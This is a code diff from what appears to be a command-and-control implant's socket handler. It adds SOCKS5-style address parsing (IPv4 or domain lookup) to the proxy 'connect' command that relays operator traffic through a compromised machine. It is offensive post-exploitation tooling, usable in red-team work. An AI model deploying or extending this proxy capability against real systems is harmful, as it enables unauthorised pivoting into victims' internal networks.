@@ -2792,30 +2792,53 @@ VOID CommandSocket( PPARSER Parser )
 
         case SOCKET_COMMAND_CONNECT: PUTS( "Socket::Connect" )
         {
-            DWORD ScId = 0;
-            LPSTR Host = NULL;
-            DWORD Addr = 0;
-            DWORD Port = 0;
+            DWORD ScId       = 0;
+            BYTE  ATYP       = 0;
+            LPSTR Host       = NULL;
+            INT   HostIpSize = 0;
+            PBYTE HostIp     = NULL;
+            DWORD Addr       = 0;
+            INT16 Port       = 0;
+            LPSTR Domain     = NULL;
 
             /* parse arguments */
-            ScId = ParserGetInt32( Parser );
-            Port = ParserGetInt32( Parser );
-            Addr = ParserGetInt32( Parser );
-            Host = ParserGetBytes( Parser, NULL );
+            ScId   = ParserGetInt32( Parser );
+            ATYP   = ParserGetByte( Parser );
+            HostIp = ParserGetBytes( Parser, &HostIpSize );
+            Port   = ParserGetInt16( Parser );
+
+            if ( ATYP == 1 )
+            {
+                // IPv4
+                Addr  = 0;
+                Addr |= ( HostIp[0] << ( 8 * 0 ));
+                Addr |= ( HostIp[1] << ( 8 * 1 ));
+                Addr |= ( HostIp[2] << ( 8 * 2 ));
+                Addr |= ( HostIp[3] << ( 8 * 3 ));
+            }
+            else if ( ATYP == 3 )
+            {
+                // DOMAINNAME
+
+                // make sure there is a nullbyte at the end of the domain
+                Domain = Instance.Win32.LocalAlloc( LPTR, HostIpSize + 1 );
+                MemCopy( Domain, HostIp, HostIpSize );
+
+                Addr = DnsQueryIP( (LPSTR)Domain );
+
+                Instance.Win32.LocalFree( Domain );
+            }
+            else
+            {
+                // TODO: add IPv6 support
+                PRINTF( "ATYP %x is not supported\n", ATYP )
+                PackageAddInt32( Package, FALSE );
+                PackageAddInt32( Package, ScId );
+                PackageAddInt32( Package, ATYP );
+                break;
+            }
 
             PRINTF( "Socket ID: %x\n", ScId )
-
-            /* check if its 0.0.0.1
-             * if it's an addr then query for the host.
-             * if not the use the addr to connect */
-            if ( ( ( Addr >> ( 8 * 3 ) ) & 0xff ) == 0x00 &&
-                 ( ( Addr >> ( 8 * 2 ) ) & 0xff ) == 0x00 &&
-                 ( ( Addr >> ( 8 * 1 ) ) & 0xff ) == 0x00 &&
-                 ( ( Addr >> ( 8 * 0 ) ) & 0xff ) == 0x1 )
-            {
-                /* query ip from specified host/domain */
-                Addr = DnsQueryIP( Host );
-            }
 
             /* check if address is not 0 */
             if ( Addr )
@@ -2829,6 +2852,7 @@ VOID CommandSocket( PPARSER Parser )
             else PackageAddInt32( Package, FALSE );
 
             PackageAddInt32( Package, ScId );
+            PackageAddInt32( Package, ATYP );
 
             break;
         }
